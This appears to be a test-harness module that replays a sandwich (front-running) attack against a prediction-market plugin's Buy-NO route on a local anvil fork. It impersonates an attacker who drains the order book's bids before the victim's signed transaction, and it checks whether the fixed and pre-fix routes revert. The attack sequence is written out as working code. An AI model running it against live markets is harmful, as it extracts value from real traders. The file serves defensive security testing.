// TEST HARNESS ONLY (anvil fork, never the live chain). The security review's N1 sandwich, replayed against the
// plugin's Buy-NO route inside the real mm host: harness/stub-backend.mjs calls this module when the host submits
// the matching signed transaction (the plugin's "buy NO 2/2: Zap.sellYes"), BEFORE broadcasting it. An impersonated
// attacker mints YES, sells into every bid on the canonical book, and leaves a 0.001 x 50 bid, exactly the verifier's
// pattern (test/security/v1: test_live_RESIDUAL_buyNoSandwichOnRealKuruAndDeployedZap), with the leftover bid smaller
// than the victim's trade (SANDWICH_LEFTOVER_YES, default 5). The victim's sellYes then meets the drained book and
// must revert. As a CONTROL, the old route is eth_call-ed at the same post-attack state from the victim: Zap.buyNo with
// the same amount and the same bound (minAusdBack = the plugin's min-out), i.e. what the plugin sent before this fix.
import { createPublicClient, createTestClient, createWalletClient, decodeFunctionData, decodeFunctionResult, encodeFunctionData, getAddress, http, maxUint256, parseAbi, parseTransaction, recoverTransactionAddress } from "viem";
import { EXTERNAL } from "../dist/lib/config.js";
import { decodeL2, marginAccountAbi, orderBookAbi, readMarketParams } from "../dist/lib/kuru.js";

const zapAbi = parseAbi([
  "function sellYes(bytes32 seriesId, address market, uint256 yesIn, uint256 minAusdOut, address to) returns (uint256, uint256)",
  "function vault() view returns (address)",
  "function buyNo(bytes32 seriesId, address market, uint256 ausdIn, uint256 minAusdBack, address to) returns (uint256 noOut, uint256 ausdBack)",
  "error Slippage(uint256 got, uint256 min)",
]);
const vaultAbi = parseAbi(["function mintSet(bytes32 seriesId, uint256 amount)"]);
const erc20 = parseAbi(["function approve(address, uint256) returns (bool)", "function transfer(address, uint256) returns (bool)", "function balanceOf(address) view returns (uint256)"]);

export default async function frontrun({ anvil, signedTransaction }) {
  const chain = { id: 10143, name: "Monad Testnet (fork)", nativeCurrency: { name: "MON", symbol: "MON", decimals: 18 }, rpcUrls: { default: { http: [anvil] } } };
  const transport = http(anvil, { timeout: 60_000 });
  const pub = createPublicClient({ chain, transport });
  const test = createTestClient({ chain, transport, mode: "anvil" });
  const ATTACKER = getAddress("0x00000000000000000000000000000000000A77Ac");
  const FUNDER = getAddress(process.env.MAKER || "0xd572638F07829D1c3636400FB73CF34Ca6c7448a");
  const as = (account) => createWalletClient({ chain, transport, account });
  const txs = [];
  const send = async (from, address, abi, functionName, args, label) => {
    const hash = await as(from).writeContract({ address, abi, functionName, args, chain });
    const r = await pub.waitForTransactionReceipt({ hash });
    if (r.status !== "success") throw new Error(`attacker step reverted: ${label}`);
    txs.push({ label, hash });
  };

  const victim = parseTransaction(signedTransaction);
  const { args } = decodeFunctionData({ abi: zapAbi, data: victim.data });
  const [seriesId, market, yesIn, minAusdOut] = args;
  const vault = await pub.readContract({ address: victim.to, abi: zapAbi, functionName: "vault" });
  const params = await readMarketParams(pub, EXTERNAL.kuruRouter, market);
  const yes = params.base;
  const before = decodeL2(await pub.readContract({ address: market, abi: orderBookAbi, functionName: "getL2Book" }));
  const bidDepth = before.bids.reduce((s, l) => s + l.sizeU, 0n); // sizePrecision 1e6 = 6-dp YES units

  for (const a of [ATTACKER, FUNDER]) await test.impersonateAccount({ address: a });
  await test.setBalance({ address: ATTACKER, value: 10n * 10n ** 18n });
  await send(FUNDER, EXTERNAL.ausd, erc20, "transfer", [ATTACKER, bidDepth + 2_000_000n], "funder -> attacker AUSD");
  await send(ATTACKER, EXTERNAL.ausd, erc20, "approve", [vault, maxUint256], "attacker approve AUSD -> vault");
  await send(ATTACKER, vault, vaultAbi, "mintSet", [seriesId, bidDepth], `attacker mintSet ${bidDepth}`);
  await send(ATTACKER, yes, erc20, "approve", [market, maxUint256], "attacker approve YES -> book");
  await send(ATTACKER, market, orderBookAbi, "placeAndExecuteMarketSell", [bidDepth, 0n, false, false], `attacker market-sells ${bidDepth} YES into every bid`);
  await send(ATTACKER, EXTERNAL.ausd, erc20, "approve", [EXTERNAL.marginAccount, maxUint256], "attacker approve AUSD -> MarginAccount");
  await send(ATTACKER, EXTERNAL.marginAccount, marginAccountAbi, "deposit", [ATTACKER, EXTERNAL.ausd, 1_000_000n], "attacker deposit 1 AUSD margin");
  const leftover = BigInt(Math.round(Number(process.env.SANDWICH_LEFTOVER_YES || 5) * 1e6));
  await send(ATTACKER, market, orderBookAbi, "addBuyOrder", [10, leftover, true], `attacker leaves a 0.001 x ${Number(leftover) / 1e6} YES bid`);
  const after = decodeL2(await pub.readContract({ address: market, abi: orderBookAbi, functionName: "getL2Book" }));
  const fmt = (b) => b.slice(0, 3).map((l) => [Number(l.priceU) / 1e4, Number(l.sizeU) / 1e6]);
  // CONTROL: the pre-fix route at the same state, same amount, same bound, from the victim (needs its AUSD allowance
  // to the Zap, which the harness wallet granted earlier with --approve max).
  const from = await recoverTransactionAddress({ serializedTransaction: signedTransaction });
  let control;
  try {
    const r = await pub.call({ account: from, to: victim.to, data: encodeFunctionData({ abi: zapAbi, functionName: "buyNo", args: [seriesId, market, yesIn, minAusdOut, from] }) });
    const [noOut, ausdBack] = decodeFunctionResult({ abi: zapAbi, functionName: "buyNo", data: r.data });
    control = {
      call: `Zap.buyNo(ausdIn ${yesIn}, minAusdBack ${minAusdOut}) eth_call at the post-attack state`,
      outcome: "WOULD FILL",
      noOut: String(noOut),
      ausdBack: String(ausdBack),
      effectiveNoPrice: noOut > 0n ? Number(yesIn - ausdBack) / Number(noOut) : null,
    };
  } catch (e) {
    control = { call: "Zap.buyNo eth_call at the post-attack state", outcome: "reverts", reason: String(e?.shortMessage ?? e?.message ?? e).split("\n")[0] };
  }
  return {
    victimCall: { fn: "sellYes", seriesId, market, yesIn: String(yesIn), minAusdOut: String(minAusdOut) },
    attacker: ATTACKER,
    bidsBefore: fmt(before.bids),
    bidsAfter: fmt(after.bids),
    attackerTxs: txs,
    control,
  };
}
